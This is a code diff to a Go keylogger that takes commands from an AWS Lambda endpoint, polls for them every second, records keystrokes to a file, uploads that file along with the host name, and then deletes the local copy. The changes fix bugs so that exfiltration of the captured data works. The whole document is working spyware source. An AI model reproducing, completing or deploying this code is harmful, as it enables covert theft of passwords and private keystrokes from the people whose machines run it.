@@ -24,11 +24,11 @@ type keylog_lambda struct {
 	Cmd        string `json:"cmd"`
 }
 
-type file struct {
+type file_upload struct {
 	Function string `json:"function"`
-	HostName string `json:"hostName`
-	FileName string `json:"fileName`
-	FileData string `json:"fileData`
+	HostName string `json:"hostName"`
+	FileName string `json:"fileName"`
+	FileData []byte `json:"fileData"`
 }
 
 
@@ -39,7 +39,9 @@ type response struct {
 
 
 //Global values :
-var client *lambda.Lambda
+var (
+	client *lambda.Lambda
+)
 
 func init() {
 	err := godotenv.Load()
@@ -52,7 +54,7 @@ func init() {
 		SharedConfigState: session.SharedConfigEnable,
 	}))
 	
-	client := lambda.New(sess, &aws.Config{Region: aws.String("ap-southeast-2")})
+	client = lambda.New(sess, &aws.Config{Region: aws.String("ap-southeast-2")})
 }
 
 func main() {
@@ -83,7 +85,7 @@ func main() {
 			go startKeylog(hostName, fileName, cmdChan)
 		}
 		if cmd == "upload" {
-			go uploadFile(fileName)
+			go uploadFile(fileName, hostName)
 			count++
 			hook.StopEvent()
 		}
@@ -97,7 +99,7 @@ func pollCmds(hostName string, cmdChan chan<- string) {
 	var lastCmd string
 
 	for {
-		time.Sleep(5 * time.Second)
+		time.Sleep(1 * time.Second)
 		cmd := getCmd(hostName)
 		if cmd != lastCmd { 
 			lastCmd = cmd
@@ -138,19 +140,17 @@ func startKeylog(hostName string, fileName string, cmdChan chan string) {
 	}
 }
 
-func uploadFile(fileName string) error {
+func uploadFile(fileName string, hostName string) error {
 	file, err := os.ReadFile(fileName)
 	if err != nil {
 		panic(err)
 	}
 
-	toBase64 := base64.StdEncoding.EncodeToString(data)
-
-	request := file {
+	request := file_upload {
 		Function: 	"upload_file",
 		HostName: 	hostName,
 		FileName: 	fileName,
-		FileData: 	toBase64,
+		FileData: 	file,
 	}
 
 	payload, err := json.Marshal(request)
@@ -162,6 +162,8 @@ func uploadFile(fileName string) error {
 	if err != nil {
 		panic(err)
 	}
+
+	os.Remove(fileName)
 
 	return err
 }
